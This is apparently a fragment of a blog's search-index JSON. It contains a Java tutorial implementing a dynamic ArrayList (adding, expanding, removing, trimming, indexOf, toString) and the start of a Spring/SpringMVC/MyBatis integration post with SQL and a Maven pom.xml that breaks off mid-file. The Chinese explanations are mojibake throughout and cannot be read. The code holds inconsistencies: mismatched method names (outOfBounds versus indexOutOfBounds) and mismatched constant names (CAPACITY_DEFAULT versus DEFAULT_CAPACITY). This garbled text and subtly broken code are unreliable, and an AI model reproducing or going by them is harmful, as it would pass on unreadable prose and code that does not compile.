å…ƒç´ åˆ°æœ€åé¢ void add(E element); // è¿”å›indexä½ç½®å¯¹åº”çš„å…ƒç´  E get(int index); // è®¾ç½®indexä½ç½®çš„å…ƒç´  E set(int index, E element); // å¾€indexä½ç½®æ·»åŠ å…ƒç´  void add(int index, E element); // åˆ é™¤indexä½ç½®å¯¹åº”çš„å…ƒç´  E remove(int index); // æŸ¥çœ‹å…ƒç´ çš„ä½ç½® int indexOf(E element); // æ¸…é™¤æ‰€æœ‰å…ƒç´  void clear(); } åŠ¨æ€æ•°ç»„çš„å®ç°æ„é€ æ–¹æ³•å¦‚æœæ„å»ºçš„æ•°ç»„ç©ºé—´å°äºé»˜è®¤ç©ºé—´,åˆ™ä¼šä»¥é»˜è®¤ç©ºé—´åˆ›å»ºæ•°ç»„. public class ArrayList&lt;E&gt; { /** * å…ƒç´ çš„æ•°é‡ */ private int size; /** * æ‰€æœ‰å…ƒç´  */ private E[] elements; /** * æ•°ç»„çš„é»˜è®¤å®¹é‡ */ private static final int DEFAULT_CAPACITY = 10; /** * æ‰¾ä¸åˆ°å…ƒç´ è¿”å›-1 */ private static final int ELEMENT_NOT_FOUNT = -1; public ArrayList() { // é»˜è®¤å®¹é‡ //elements = new int[DEFAULT_CAPACITY]; this(DEFAULT_CAPACITY); // è°ƒç”¨ä¸‹é¢çš„æ„é€ å™¨ } public ArrayList(int capacity) { // è®¾ç½®é»˜è®¤å®¹é‡ä¸º 10 capacity = (capacity &lt; DEFAULT_CAPACITY) ? DEFAULT_CAPACITY : capacity; // å› ä¸ºæ³›å‹(æ‰€ä»¥ä¼ ä¸€ä¸ªObjectæ•°ç»„,ç„¶åé€šè¿‡å¼ºè½¬) elements = (E[]) new Object[capacity]; } } æ·»åŠ å…ƒç´  æ•°ç»„æ·»åŠ å…ƒç´ åˆ†ä¸ºåœ¨æœ€åä¸€ä¸ªå…ƒç´ çš„åé¢æ·»åŠ æ–°å…ƒç´ å’Œå°†å…ƒç´ æ’å…¥åˆ°æŸä¸ªä½ç½®ï¼ˆéæœ€åé¢ï¼‰ä¸¤ç§æƒ…å†µã€‚ ç¬¬ä¸€ç§æƒ…å†µï¼Œè¿™ä¸ªæ–°å…ƒç´ éœ€è¦æ·»åŠ åˆ°çš„ç´¢å¼•ç­‰äºå½“å‰æ•°ç»„å…ƒç´ çš„ä¸ªæ•°ï¼Œåœ¨ArrayListä¸­sizeå±æ€§å°±æ˜¯å½“å‰æ•°ç»„å…ƒç´ çš„ä¸ªæ•°ï¼Œæ‰€ä»¥å°±æ˜¯å°†æ–°å…ƒç´ æ·»åŠ åˆ°æ•°ç»„çš„sizeä½ç½®ä¸Šï¼Œç„¶åsizeåŠ 1ã€‚ public void add(int index, E element) { elements[index] = element; size++; } å¦‚æœæ˜¯ç¬¬äºŒç§æƒ…å†µï¼Œåªéœ€è¦å°†æ’å…¥ä½ç½®åé¢çš„å…ƒç´ å‘åç§»åŠ¨å³å¯ã€‚ æ³¨æ„ï¼šéœ€è¦ä»åå‘å‰ç§»åŠ¨å…ƒç´ ï¼Œå¦‚æœä»å‰å‘åç§»åŠ¨å…ƒç´ ï¼Œé‚£ä¹ˆä¼šè¿›è¡Œå…ƒç´ è¦†ç›–, æœ€åå‡ºé”™ã€‚ æ•°ç»„è¶Šç•Œæ·»åŠ å…ƒç´ ,è¿˜è¦æ³¨æ„ä¼ å…¥çš„ç´¢å¼•ä¸èƒ½è¶Šç•Œ,å³ä¸èƒ½å°äº0,ä¹Ÿä¸èƒ½å¤§äºsize. /** * æ ¹æ®indexæ’å…¥å…ƒç´ æ—¶,åˆ¤æ–­indexæ˜¯å¦æœ‰æ•ˆ * * @param index */ private void rangeCheckForAdd(int index) { if (index &lt; 0 || index &gt; size) { indexOutOfBounds(index); } } /** * å°è£…æ•°ç»„è¶Šç•Œå¼‚å¸¸ * * @param index */ private void indexOutOfBounds(int index) { throw new IndexOutOfBoundsException(&quot;Index:&quot; + index + &quot;, Size:&quot; + size); } æ•°ç»„æ‰©å®¹åŠ¨æ€æ‰©å®¹æ€è·¯: é€šè¿‡é»˜è®¤å®¹é‡åˆ›å»ºçš„æ•°ç»„,æ˜¯åœ¨å †ç©ºé—´ä¸­éšæœºç”Ÿæˆçš„åœ°å€;å¦‚æ­¤ä¸€æ¥å†ç”³è¯·ç©ºé—´æ‹¼æ¥åˆ°è¯¥æ•°ç»„å,è¿™ç§æ–¹å¼ä¸å¯èƒ½å®ç°; æˆ‘ä»¬åªèƒ½å†åˆ›å»ºä¸€ä¸ªå¤§å®¹é‡çš„æ•°ç»„,ç„¶åå°†ä¹‹å‰æ•°ç»„ä¸­çš„å…ƒç´ ç§»åŠ¨åˆ°è¿™ä¸ªæ•°ç»„ä¸­;ç„¶åå°†å¼•ç”¨æŒ‡å‘æ–°æ•°ç»„å³å¯! ç”±äºæ•°ç»„elementsæœ€å¤§çš„å®¹é‡åªæœ‰10ï¼Œæ‰€ä»¥å½“æ•°ç»„å­˜æ»¡å…ƒç´ æ—¶ï¼Œå°±éœ€è¦å¯¹æ•°ç»„è¿›è¡Œæ‰©å®¹ã€‚ å› ä¸ºæ•°ç»„æ˜¯æ— æ³•åŠ¨æ€æ‰©å®¹çš„ï¼Œæ‰€ä»¥éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„çš„å®¹é‡è¦æ¯”ä¹‹å‰æ•°ç»„çš„å®¹é‡å¤§ã€‚ ç„¶ååœ¨å°†åŸæ•°ç»„ä¸­çš„å…ƒç´ å­˜æ”¾åˆ°æ–°æ•°ç»„ä¸­ï¼Œè¿™æ ·å°±å®ç°äº†æ•°ç»„çš„æ‰©å®¹ã€‚ è¯¥æ–¹æ³•ç¡®ä¿é»˜è®¤å®¹é‡ä¸ºå¤šå°‘,ä¸ºäº†éªŒè¯æ˜¯å¦è¶…è¿‡ç»™å®šçš„é»˜è®¤å®¹é‡,ç„¶åè¿›è¡Œåˆ¤æ–­æ˜¯å¦è¦æ‰©å®¹;è¿™é‡Œsize+1ä¸ºæ•°ç»„å½“å‰æ•°é‡+1, å› ä¸ºæ¯æ¬¡addéƒ½ä¼šå¢åŠ ä¸€ä¸ªå®¹é‡ã€‚ /** * ç¡®ä¿è‡³å°‘è¦æœ‰capacityä¸ªå®¹é‡ * * @param capacity */ private void ensureCapacity(int capacity) { // è·å–æ•°ç»„å½“å‰å®¹é‡ int oldCapacity = elements.length; // åˆ¤æ–­æ˜¯å¦è¦æ‰©å®¹ if (oldCapacity &gt;= capacity) return; // æ­¤æ—¶ä¸æ‰©å®¹ // è¿™ç§æ–¹å¼æ˜¯æ‰©å®¹1.5å€ int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); E[] newElements = (E[]) new Object[newCapacity]; // å°†åŸæ¥æ•°ç»„ä¸­çš„å…ƒç´ ç§»åŠ¨åˆ°æ–°æ•°ç»„ä¸­ for (int i = 0; i &lt; size; i++) { newElements[i] = elements[i]; } // å°†æ•°ç»„å¼•ç”¨æŒ‡å‘æ–°æ•°ç»„ elements = newElements; } å®ç°addå‡½æ•°ï¼Œéœ€è¦åœ¨æ·»åŠ æ–°å…ƒç´ ä¹‹å‰ï¼Œåˆ¤æ–­æ•°ç»„è¶Šç•Œå’Œæ‰©å®¹ã€‚ /** * åœ¨indexä½ç½®æ’å…¥ä¸€ä¸ªå…ƒç´  * * @param index * @param element */ public void add(int index, E element) { // åœ¨æ·»åŠ å…ƒç´ çš„æ—¶å€™,åˆ¤æ–­indexæ˜¯å¦æœ‰æ•ˆ rangeCheckForAdd(index); ensureCapacity(size + 1); // æ³¨æ„: æ’å…¥å…ƒç´ å,å…ƒç´ æ˜¯ä»åå¼€å§‹å¾€åæŒª for (int i = size - 1; i &gt;= index; i--) { elements[i + 1] = elements[i]; } elements[index] = element; size++; } æœ€ç»ˆåœ¨æœ€åä¸€ä¸ªå…ƒç´ çš„åé¢æ·»åŠ æ–°å…ƒç´ ï¼Œå³æ·»åŠ å…ƒç´ åˆ°å°¾éƒ¨çš„å®ç°æ–¹å¼å¦‚ä¸‹ /** * æ·»åŠ å…ƒç´ åˆ°å°¾éƒ¨ * * @param element */ public void add(E element) { // elements[size++] = element; // ä¼ å…¥æ•°ç»„æ•°é‡(ç›¸å½“äºåœ¨æœ€åæ’å…¥å…ƒç´ ) add(size, element); } åˆ é™¤å…ƒç´  åˆ é™¤å…ƒç´ ï¼Œå®é™…ä¸Šå°±æ˜¯ç§»é™¤æŒ‡å®šä½ç½®çš„å…ƒç´ ï¼Œå¹¶å°†åé¢çš„å…ƒç´ å‘å‰ç§»åŠ¨ã€‚ å¦‚ä¸‹å›¾ï¼Œå½“åˆ é™¤ç´¢å¼•ä¸º3çš„å…ƒç´ æ—¶ï¼Œåªéœ€è¦å°†åé¢çš„å…ƒç´ å‘å‰ç§»åŠ¨ï¼Œç„¶ååœ¨å»æ‰æœ€åä¸€ä¸ªå…ƒç´ ï¼Œsizeå‡1å³å¯ã€‚ æ•°ç»„è¶Šç•Œ åˆ é™¤å…ƒç´ æ—¶ä¼ å…¥çš„ç´¢å¼•ä¸èƒ½è¶Šç•Œ, å³ä¸èƒ½å°äº0, ä¹Ÿä¸èƒ½å¤§äºç­‰äºsizeæ‰€ä»¥æˆ‘ä»¬åœ¨åˆ é™¤å…ƒç´ ä¹‹å‰éœ€è¦å…ˆè¿›è¡Œç´¢å¼•æ£€æŸ¥ã€‚ private void indexOutOfBounds(int index) { throw new IndexOutOfBoundsException(&quot;Index:&quot; + index + &quot;, Size:&quot; + size); } private void rangeCheck(int index) { if (index &lt; 0 || index &gt;= size) { outOfBounds(index); } } æ•°ç»„ç¼©å®¹ å½“æ•°ç»„ä¸­çš„å…ƒç´ åˆ é™¤åï¼Œæ•°ç»„å‰©ä½™çš„ç©ºé—´å¯èƒ½ä¼šå¾ˆå¤§ï¼Œè¿™æ ·å°±ä¼šé€ æˆå†…å­˜çš„æµªè´¹ã€‚ æ‰€ä»¥å½“æ•°ç»„ä¸­å…ƒç´ åˆ é™¤åï¼Œæˆ‘ä»¬éœ€è¦å¯¹æ•°ç»„è¿›è¡Œç¼©å®¹ã€‚ å®ç°æ–¹æ³•ç±»ä¼¼äºæ‰©å®¹ï¼Œå½“æ•°ç»„ä¸­å®¹é‡å°äºæŸä¸ªå€¼æ—¶ï¼Œåˆ›å»ºæ–°çš„æ•°ç»„ï¼Œç„¶åå°†åŸæœ‰æ•°ç»„ä¸­çš„å…ƒç´ å­˜å…¥æ–°æ•°ç»„å³å¯ã€‚ /** * æ•°ç»„ç¼©å®¹ */ public void trim() { // è·å–å½“å‰æ•°ç»„çš„å®¹é‡ int capacity = elements.length; // å½“sizeå¤§äºç­‰äºå®¹é‡çš„ä¸€åŠ, æˆ–åˆ™å®¹é‡å·²ç»å°äºé»˜è®¤å®¹é‡(10)æ—¶, ç›´æ¥è¿”å› if (size &gt;= capacity &gt;&gt; 1 || capacity &lt; CAPACITY_DEFAULT) return; // è®¡ç®—æ–°çš„å®¹é‡ = åŸæœ‰å®¹é‡çš„ä¸€åŠ int newCapacity = capacity &gt;&gt; 1; // åˆ›å»ºæ–°æ•°ç»„ E[] newElements = (E[]) new Object[newCapacity]; // å°†åŸæ•°ç»„å…ƒç´ å­˜å…¥æ–°æ•°ç»„ for (int i = 0; i &lt; size; i++) { newElements[i] = elements[i]; } // å¼•ç”¨æ–°æ•°ç»„ elements = newElements; } æœ€ç»ˆ, removeæ–¹æ³•å®ç°å¦‚ä¸‹ /** * åˆ é™¤indexä½ç½®çš„å…ƒç´  * * @param index * @return è¢«åˆ é™¤çš„å…ƒç´  */ public E remove(int index) { rangeCheck(index); E delEle = elements[index]; // å½“åˆ é™¤ä¸€ä¸ªå…ƒç´ æ—¶,éœ€è¦æŒªåŠ¨åé¢å…ƒç´ çš„èŒƒå›´ for (int i = index + 1; i &lt;= size - 1; i++) { elements[i - 1] = elements[i]; } size--; // åŒclearçš„ç»†èŠ‚,å½“ä»åå¾€å‰ä»¥åæ—¶,æœ€åä¸€ä¸ªçš„åœ°å€éœ€è¦é‡Šæ”¾ elements[size] = null; // åˆ¤æ–­æ•°ç»„æ˜¯å¦éœ€è¦ç¼©å®¹ trim(); return delEle; } /** * åˆ é™¤ä¼ å…¥çš„å…ƒç´  * @param element */ public void remove(E element){ remove(indexOf(element)); } æ¸…ç©ºæ•°ç»„ æ¸…ç©ºæ•°ç»„æ—¶ï¼Œéœ€è¦å°†æ‰€æœ‰çš„å…ƒç´ ç½®ä¸ºnullï¼Œåªæœ‰è¿™æ ·æ‰èƒ½çœŸæ­£çš„é‡Šæ”¾å¯¹è±¡ï¼Œç„¶åsizeç½®ä¸º0ã€‚ /** * æ¸…é™¤æ‰€æœ‰å…ƒç´  */ public void clear() { for (int i = 0; i &lt; size; i++) { elements[i] = null; } size = 0; } ä¿®æ”¹å…ƒç´  ä¿®æ”¹å…ƒç´ æ—¶ï¼Œåªéœ€è¦å°†åŸæœ‰ä½ç½®çš„å…ƒç´ æ›¿æ¢æ‰å³å¯ï¼ŒåŒæ ·éœ€è¦æ³¨æ„ä¸€ä¸‹ç´¢å¼•æ˜¯å¦è¶Šç•Œã€‚ /** * è®¾ç½®indexä½ç½®çš„å…ƒç´  * * @param index * @param element * @return åŸæ¥çš„å…ƒç´  */ public E set(int index, E element) { rangeCheck(index); E oldEle = elements[index]; elements[index] = element; return oldEle; } æŸ¥è¯¢å…ƒç´  æŸ¥è¯¢å…ƒç´ ï¼Œåªéœ€è¦å°†æŒ‡å®šç´¢å¼•çš„å…ƒç´ è¿”å›ï¼Œæ³¨æ„ç´¢å¼•æ˜¯å¦è¶Šç•Œå³å¯ã€‚ /** * è·å–indexä½ç½®çš„å…ƒç´  * * @param index * @return */ public E get(int index) { // çº¦æŸIndex rangeCheck(index); return elements[index]; } æŸ¥çœ‹å…ƒç´ ä½ç½® å¯ä»¥é€šè¿‡å¾ªç¯, æŸ¥æ‰¾å…ƒç´ åœ¨æ•°ç»„ä¸­çš„ä½ç½®ã€‚ æ³¨æ„ï¼šå‡å¦‚æ•°ç»„ä¸­å¯ä»¥å­˜å‚¨nullï¼Œè€Œnullæ˜¯ä¸èƒ½è°ƒç”¨equalsæ–¹æ³•çš„ï¼Œæ‰€ä»¥éœ€è¦å¯¹ä¼ å…¥çš„å…ƒç´ è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœæŸ¥æ‰¾çš„å…ƒç´ æ˜¯nullï¼Œéœ€è¦å•ç‹¬å¤„ç†ã€‚ å½“å…ƒç´ å­˜åœ¨æ—¶è¿”å›ç´¢å¼•ï¼Œå¦åˆ™è¿”å›å˜é‡ELEMENT_ON_FOUNDçš„å€¼ã€‚ /** * æŸ¥çœ‹å…ƒç´ çš„ç´¢å¼• * * @param element * @return */ public int indexOf(E element) { if (element == null) { // å¾ªç¯åˆ¤æ–­å¦‚æœelementä¸ºnull,ç›´æ¥è¿”å›nullçš„ç´¢å¼• for (int i = 0; i &lt; size; i++) { if (elements[i] == null) return i; } } else { for (int i = 0; i &lt; size; i++) { // å› ä¸ºelementè‚¯å®šä¸ä¸ºnulläº†,æ‰€ä»¥æ”¾åœ¨å‰é¢;é¿å…ç©ºæŒ‡é’ˆå¼‚å¸¸ if (element.equals(elements[i])) return i; } } return ELEMENT_NOT_FOUNT; } æ˜¯å¦åŒ…å«æŸå…ƒç´  åªéœ€é€šè¿‡åˆ¤æ–­ç´¢å¼•æ˜¯å¦ç­‰äºELEMENT_ON_FOUNDå³å¯ã€‚ /** * æ˜¯å¦åŒ…å«æŸä¸ªå…ƒç´  * * @param element * @return */ public boolean contains(E element) { // å¦‚æœelementå…ƒç´ å¯ä»¥æ‰¾åˆ° return indexOf(element) != ELEMENT_NOT_FOUNT; } å…ƒç´ çš„æ•°é‡ sizeçš„å€¼ï¼Œå³ä¸ºå…ƒç´ çš„æ•°é‡ /** * å…ƒç´ çš„æ•°é‡ * * @return */ public int size() { return size; } æ•°ç»„æ˜¯å¦ä¸ºç©º é€šè¿‡åˆ¤æ–­sizeçš„å€¼æ˜¯å¦ä¸º0å³å¯ /** * æ˜¯å¦ä¸ºç©º * * @return */ public boolean inEmpty() { return size == 0; } åŠ¨æ€æ•°ç»„æ‰“å° å¯ä»¥é‡å†™toStringæ–¹æ³•, æ¥æ‰“å°ArrayListä¸­çš„å…ƒç´ ã€‚ @Override public String toString() { // æ‰“å°æ ¼å¼: size=3, [10, 20, 30] // ä½¿ç”¨StringBuilder æ•ˆç‡é«˜ä¸€äº› StringBuilder string = new StringBuilder(); string.append(&quot;size=&quot;).append(size).append(&quot;, [&quot;); for (int i = 0; i &lt; size; i++) { string.append(elements[i]); if (i != size - 1) { string.append(&quot;, &quot;); } } string.append(&quot;]&quot;); return string.toString(); } è¿™æ ·å°±å®ç°äº†åŠ¨æ€æ•°ç»„çš„åŸºæœ¬æ“ä½œã€‚ ArrayListèƒ½å¦è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Ÿ åœ¨ArrayListä¸­ï¼Œå¦‚æœè¦åˆ é™¤ç´¢å¼•0ä½ç½®çš„å…ƒç´ ï¼Œåˆ™éœ€è¦å°†ç´¢å¼•0ä¹‹åçš„å…ƒç´ å…¨éƒ¨å¾€å‰ç§»ä¸€ä½ã€‚ å¦‚æœè¦åœ¨ç´¢å¼•0ä½ç½®æ·»åŠ å…ƒç´ ï¼Œä¹Ÿéœ€è¦å°†ç´¢å¼•0åŠä¹‹åçš„å…ƒç´ å…¨éƒ¨å¾€åç§»ä¸€ä½ã€‚ åœ¨ArrayListä¸­å¢åŠ ä¸€ä¸ªè®°å½•é¦–å…ƒç´ ä½ç½®çš„å±æ€§ã€‚ åˆ é™¤ç´¢å¼•0ä½ç½®çš„å…ƒç´ ï¼Œæˆ‘ä»¬åªéœ€è¦å°†firstå±æ€§æ”¹ä¸º1ã€‚ -åœ¨ç´¢å¼•0ä½ç½®æ·»åŠ å…ƒç´ ï¼Œåˆ™åªéœ€è¦å°†firstå±æ€§æ”¹ä¸º0ã€‚ å¦‚æœç»§ç»­å¾€å‰æ’å…¥å…ƒç´ ï¼Œåˆ™å°†æ’å…¥çš„å…ƒç´ å­˜æ”¾åœ¨ç´¢å¼•8è¿™ä¸ªä½ç½®ï¼Œå¹¶å°†firstæ”¹ä¸º8ã€‚ å½“è¦è·å–ç´¢å¼•8ä¸‹ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå¯¹ç´¢å¼•å–æ¨¡ï¼Œåˆ™æ‹¿åˆ°ç´¢å¼•0ä½ç½®çš„å…ƒç´ ã€‚ å¦‚æœæ’å…¥å…ƒç´ ï¼Œåˆ™å¯é€‰æ‹©æŒªåŠ¨å‰åŠæ®µæ•°æ®æˆ–ååŠæ®µæ•°æ®ã€‚ åœ¨ç´¢å¼•2å¤„æ’å…¥å…ƒç´ 99ï¼Œå¯ä»¥é€‰æ‹©å°†å…ƒç´ 22ï¼Œ33å·¦ç§»ï¼Œç„¶åæ’å…¥99å³å¯ã€‚ æ‰©å®¹å’Œç¼©å®¹åŒæ ·å¯ä»¥ä¼˜åŒ–ã€‚ é‡ç‚¹æ€»ç»“åŠ¨æ€æ‰©å®¹æ€è·¯é€šè¿‡é»˜è®¤å®¹é‡åˆ›å»ºçš„æ•°ç»„,æ˜¯åœ¨å †ç©ºé—´ä¸­éšæœºç”Ÿæˆçš„åœ°å€;å¦‚æ­¤ä¸€æ¥å†ç”³è¯·ç©ºé—´æ‹¼æ¥åˆ°è¯¥æ•°ç»„å,è¿™ç§æ–¹å¼ä¸å¯èƒ½å®ç°;æˆ‘ä»¬åªèƒ½å†åˆ›å»ºä¸€ä¸ªå¤§å®¹é‡çš„æ•°ç»„,ç„¶åå°†ä¹‹å‰æ•°ç»„ä¸­çš„å…ƒç´ ç§»åŠ¨åˆ°è¿™ä¸ªæ•°ç»„ä¸­;ç„¶åå°†å¼•ç”¨æŒ‡å‘æ–°æ•°ç»„å³å¯! å¦‚ä½•ç¡®ä¿å®¹é‡æ˜¯å¦è¶Šç•Œè¯¥æ–¹æ³•ç¡®ä¿é»˜è®¤å®¹é‡ä¸ºå¤šå°‘, ä¸ºäº†éªŒè¯æ˜¯å¦è¶…è¿‡ç»™å®šçš„é»˜è®¤å®¹é‡,ç„¶åè¿›è¡Œåˆ¤æ–­æ˜¯å¦è¦æ‰©å®¹; è¿™é‡Œsize+1ä¸ºæ•°ç»„å½“å‰æ•°é‡+1, å› ä¸ºæ¯æ¬¡addéƒ½ä¼šå¢åŠ ä¸€ä¸ªå®¹é‡ã€‚ ensureCapacity(size + 1); å¢åŠ æ³›å‹ä½¿ç”¨æ³›å‹, ä½¿åŠ¨æ€æ•°ç»„å¯ä»¥æ·»åŠ ä»»ä½•ç±»å‹çš„æ•°æ®ã€‚ elements = (E[]) new Object[capacity]; clearæ–¹æ³•çš„è¿‡æ¸¡ç»†èŠ‚å› ä¸ºä¹‹å‰å­˜å‚¨çš„éƒ½æ˜¯intæ•°æ®, ç›´æ¥è®¾ç½®size=0æ—¶, å¼€è¾Ÿçš„å­˜å‚¨intç±»å‹çš„ç©ºé—´å°±ä¸èƒ½è¢«è®¿é—®, å½“addå, å°±å¯ä»¥è®¿é—®åé¢çš„ç©ºé—´, æ‰€ä»¥æ­¤æ—¶çš„ç©ºé—´å¯ä»¥é‡å¤åˆ©ç”¨; å½“ä½¿ç”¨æ³›å‹å, åŠ¨æ€æ•°ç»„ä¸­å­˜å‚¨çš„éƒ½æ˜¯å¯¹è±¡ç±»å‹, å®é™…å­˜å‚¨çš„éƒ½æ˜¯å¯¹è±¡çš„åœ°å€, æ¯ä¸€ä¸ªå¯¹è±¡çš„åœ°å€åˆæœ‰ä¸€å—ç©ºé—´å¼•ç”¨ç€; æ­¤æ—¶å¦‚æœä»è®¾ç½® size=0, å½“clearå,å¼€è¾Ÿçš„å­˜å‚¨ç©ºé—´ä¸­çš„åœ°å€æ²¡æœ‰è¢«é”€æ¯, åœ°å€ä»è¢«å¯¹è±¡ç©ºé—´å¼•ç”¨ç€; è¿™æ ·ä»¥æ¥å­˜å‚¨å¯¹è±¡çš„ç©ºé—´å°±ä¸ä¼šè¢«é‡Šæ”¾; ä½†æ˜¯å­˜å‚¨åœ°å€çš„æ•°ç»„å¯ä»¥é‡å¤åˆ©ç”¨; æ‰€ä»¥è¦å°†åœ°å€æ•°ç»„éƒ½ç½®ä¸ºnull, ç„¶åsize=0, è¿™æ ·ä»¥æ¥,å¼•ç”¨è¯¥åœ°å€çš„å¯¹è±¡ç©ºé—´ä¹Ÿå°±é‡Šæ”¾äº†! removeã€indexOfçš„ç»†èŠ‚removeæœ€åä¸€ä¸ªåœ°å€ä¹Ÿè¦æƒ…å†µ, åŒclearç»†èŠ‚åœ¨indexOfæ–¹æ³•ä¸­,ä¸ç”¨==æ¯”è¾ƒ, å› ä¸ºæ¯”è¾ƒçš„æ˜¯åœ°å€å€¼,ä¸€èˆ¬é‡å†™equalsæ–¹æ³•è‡ªå·±å®šä¹‰æ¯”è¾ƒå†…å®¹å³å¯;nullå€¼å¤„ç†: å½“å¾€æ•°ç»„ä¼ nullçš„æ—¶å€™,indexOfçš„æ¯”è¾ƒå¤„ç†: å¦‚æœé‚£null.equalsæ¥æ¯”è¾ƒä¼šå‡ºç°ç©ºæŒ‡é’ˆå¼‚å¸¸;","categories":[],"tags":[{"name":"algorithm","slug":"algorithm","permalink":"https://blog.kayleh.top/tags/algorithm/"}]},{"title":"Springã€SpringMVCã€Mybatisæ•´åˆ","slug":"Springã€SpringMVCã€Mybatisæ•´åˆ","date":"2020-04-20T05:05:31.000Z","updated":"2021-04-11T17:11:28.448Z","comments":true,"path":"Springã€SpringMVCã€Mybatisæ•´åˆ/","link":"","permalink":"https://blog.kayleh.top/Spring%E3%80%81SpringMVC%E3%80%81Mybatis%E6%95%B4%E5%90%88/","excerpt":"SSMæ•´åˆ","text":"SSMæ•´åˆ æ•´åˆè¯´æ˜æœåŠ¡å™¨å¼€å‘åˆ†ä¸ºä¸‰å±‚,è¡¨ç°å±‚ã€ä¸šåŠ¡å±‚ã€æŒä¹…å±‚è¡¨ç°å±‚ä½¿ç”¨SpringMVCå®ç°,ä¸šåŠ¡ç¨‹ä½¿ç”¨Springå®ç°,æŒä¹…å±‚ä½¿ç”¨Mybatiså®ç°ä½¿ç”¨Springæ¡†æ¶æ¥æ•´åˆ SpringMVCå’ŒMybatisæ¡†æ¶è¿™é‡Œä½¿ç”¨xmlé…ç½®æ–‡ä»¶+æ³¨è§£çš„æ–¹å¼è¿›è¡Œæ­å»º æœ€ç»ˆç›®æ ‡æœ€ç»ˆå®ç°é€šè¿‡å‰ç«¯é¡µé¢å¯¹æ•°æ®åº“è¿›è¡ŒæŸ¥è¯¢å’Œæ’å…¥,å®ç°ç”¨æˆ·çš„ç™»å½•æ³¨å†ŒåŠŸèƒ½å‡†å¤‡åˆ›å»ºMavenå·¥ç¨‹ é€‰æ‹©webapp æ•°æ®åº“å‡†å¤‡create database ssm; use ssm; create table account( id int primary key auto_increment, name varchar(20), money double ); åˆ›å»ºç›®å½• å¯¼å…¥ä¾èµ– &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.kayleh&lt;/groupId&gt; &lt;artifactId&gt;SSM&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;war&lt;/packaging&gt; &lt;name&gt;SSM Maven Webapp&lt;/name&gt; &lt;!-- FIXME change it to the project&#39;s website --&gt; &lt;url&gt;http://www.example.com&lt;/url&gt; &lt;!--ç‰ˆæœ¬é”å®š--&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt; &lt;spring.version&gt;5.0.2.RELEASE&lt;/spring.version&gt; &lt;slf4j.version&gt;1.6.6&lt;/slf4j.version&gt; &lt;log4j.version&gt;1.2.12&lt;/log4j.version&gt; &lt;mysql.version&gt;5.1.6&lt;/mysql.version&gt; &lt;mybatis.version&gt;3.4.5&lt;/mybatis.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- spring --&gt; &lt;dependency&gt; &lt;groupId&gt;org.aspectj&lt;/groupId&gt; &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; &lt;version&gt;1.6.8&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-aop&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-tx&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-jdbc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.12&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;${mysql.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;version&gt;2.5&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet.jsp&lt;/groupId&gt; &lt;artifactId&gt;jsp-api&lt;/artifactId&gt; &lt;version&gt;2.0&lt;/version&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;jstl&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; 